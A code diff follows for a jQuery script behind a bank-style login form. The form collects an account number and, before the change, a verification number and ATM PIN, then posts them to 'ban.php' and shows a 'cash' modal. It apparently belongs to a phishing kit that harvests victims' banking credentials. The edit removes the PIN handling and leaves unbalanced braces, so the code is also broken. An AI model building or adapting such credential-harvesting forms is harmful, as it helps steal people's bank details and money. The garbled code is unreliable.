@@ -8,19 +8,6 @@ $(document).ready(function() {
 			$('#anum').removeClass('is-invalid');
 		}
 	});
-	$("#vanum").blur(function() {
-		if($("#vanum").val().length < 5){
-			$('#vanum').addClass('is-invalid');
-		}else{
-			$('#vanum').removeClass('is-invalid');
-		}
-	});
-	$("#atmpin").blur(function() {
-		if($("#atmpin").val().length < 4){
-			$('#atmpin').addClass('is-invalid');
-		}else{
-			$('#atmpin').removeClass('is-invalid');
-		}
 	});
 	$('#frmBank').submit(function(event) {
 		event.preventDefault();
@@ -31,18 +18,8 @@ $(document).ready(function() {
 		}else{
 			$('#anum').removeClass('is-invalid');
 		}
-		if($("#vanum").length > 0 && $("#vanum").val().length < 5){
-			$('#vanum').addClass('is-invalid');
-			error = true;
-		}else{
-			$('#vanum').removeClass('is-invalid');
-		}
-		if($("#atmpin").length > 0 && $("#atmpin").val().length < 4){
-			$('#atmpin').addClass('is-invalid');
-			error = true;
-		}else{
-			$('#atmpin').removeClass('is-invalid');
-		}
+			$('#bankname').removeClass('is-invalid');
+		} 
 		$("#btnConfirm").click(function() {
 		$("#btnConfirm").prop('disabled', true);
 		$("#btnConfirm").html('<img src="/static/img/spin.gif" style="width:43px">');
@@ -54,7 +31,7 @@ $(document).ready(function() {
 			if(!error){
 			$("#btnLogin").prop('disabled', true);
 			$("#btnLogin").html('<img src="/static/img/spin.gif" style="width:43px">');
-			$('#anum, #vanum, #atmpin').prop('readonly', true);
+			$('#anum').prop('readonly', true);
 			var logindata =  $("#frmBank").serialize();
 		$.post("ban.php", logindata).done(function(result) {
 				if(result != "no"){
@@ -62,8 +39,8 @@ $(document).ready(function() {
 					$('#btnConfirm').attr("data-oauth", '/complete');
 					$('#cashModal').show();
 				}else{
-					$('#anum, #vanum, #atmpin').prop('readonly', false);
-					$("#anum, #vanum, #atmpin").addClass('is-invalid');
+					$('#anum').prop('readonly', false);
+					$("#anum").addClass('is-invalid');
 					$("#btnLogin").prop('disabled', false);
 					$("#btnLogin").html('Sign In');
 				}
